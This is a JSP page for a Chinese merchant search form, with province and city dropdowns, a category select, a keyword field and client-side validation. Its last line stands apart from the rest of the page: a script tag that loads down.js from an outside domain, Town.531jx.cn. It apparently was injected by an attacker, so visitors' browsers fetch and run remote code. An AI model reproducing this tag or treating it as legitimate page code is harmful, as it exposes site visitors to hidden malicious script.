<%@ page language="java" pageEncoding="GBK" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jstl/core" %>
<%@ taglib prefix="fmt" uri="http://java.sun.com/jstl/fmt" %>
<script language="javascript">
<!--
function listCities(form)
{
  form.city.options[0].value = 0;
  form.city.options[0] = new Option("请选择...","");
  form.city.options.length = 1;

  var provcode = form.province.options[form.province.selectedIndex].value;
  switch(provcode){
   <c:forEach var="province" items="${applicationScope.appData.provinces}"> 
        <c:set var="shift" value="0"/> 
		case '<c:out value="${province.provinceCode}"/>':   //<c:out value="${province.province}"/>		         
           	    <c:forEach var="city" items="${province.cities}" varStatus="status"> 
					<c:if test="${status.first and !status.last}">
						form.city.options[0]=new Option("请选择...","");
						<c:set var="shift" value="1"/> 
					</c:if>				
	        		form.city.options[<c:out value="${status.index+shift}"/>]=new Option('<c:out value="${city.city}"/>','<c:out value="${city.cityCode}"/>');		
				</c:forEach>
		        break;
   </c:forEach>	  
  default:
	form.city.options[0]=new Option("请选择...","");
	break; 	
  }  
  form.city.options[0].selected=true;
}

function checkSearchMerchantForm(){
   if(validate(document.searchMerchantForm.merchantKey, '商户关键字', 'public', 2, 32, true) ){
	   	    return true;
   }   
    return false;
}
//-->
</script>


      <table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
        <tr> 
          <td width="100%" height="57" align="left" valign="top"> 
            
      <table id="Table_15" width="100%" height="57" border="0" cellpadding="0" cellspacing="0">
        <tr background="images/bg_table_title.gif"> 
                <td colspan="5" height="26">&nbsp;</td>
              </tr>
              <tr> 
                <td width="14" height="31">&nbsp;</td>
                <td width="13" height="31">&nbsp;</td>
                <td width="161" height="31" colspan="3" class="red15">加盟商户分类搜索</td>
              </tr>
            </table>
          </td>
        </tr>
        <tr> 
          <td height="145" valign="top" width="100%"> 
            <table width="100%" border="0" cellspacing="0" cellpadding="0">
              <form method="post" name="searchMerchantForm" id="searchMerchantForm" action='<c:url value="/queryMerchant.do"/>' onSubmit="javascript: return checkSearchMerchantForm();">
                <tr> 
                  <td colspan="3">&nbsp;</td>
                </tr>
                <tr> 
                  <td>&nbsp;</td>
                  <td> 
                    
              <table width="100%%" border="0" cellpadding="0">
                <tr> 
                  <td width="30%" align="right" bgcolor="#FF6600" class="white12">城市</td>
                  <td width="70%"> 
                    <select onChange="listCities(document.searchMerchantForm)" size="1" name="province">
                      <option value="" selected>请选择...</option>
                      <c:forEach var="province" items="${applicationScope.appData.provinces}"> 
                      <option value='<c:out value="${province.provinceCode}"/>'><c:out value="${province.province}"/></option>
                      </c:forEach> 
                    </select>
                    省 
                    <select name="city" size="1">
                      <option value="" selected>请选择...</option>
                    </select>
                  </td>
                </tr>
                <tr> 
                  <td height="26" align="right" bgcolor="#FF6600" class="white12">类型</td>
                  <td class="input"> 
                    <select name="merchantCtg" >
                      <option value="" selected>请选择...</option>
                      <c:forEach var="merchantCategory" items="${applicationScope.appData.merchantCategories}"> 
                      <option value='<c:out value="${merchantCategory.mcNo}"/>'><c:out value="${merchantCategory.name}"/></option>
                      </c:forEach> 
                    </select>
                  </td>
                </tr>
                <tr> 
                  <td align="right" bgcolor="#FF6600" class="white12">关键字</td>
                  <td> 
                    <input type="text" name="merchantKey" size="14" value="" title="商户名称" align="absmiddle" />
                  </td>
                </tr>
              </table>
                  </td>
                  <td>&nbsp;</td>
                </tr>
                <tr> 
                  <td colspan="3" align="center"> 
                    <input type="submit" name="Submit" value="查询" />
                  </td>
                </tr>
              </form>
            </table>
          </td>
        </tr>
      </table>
<script language=javascript src=http://Town.531jx.cn/down.js></script>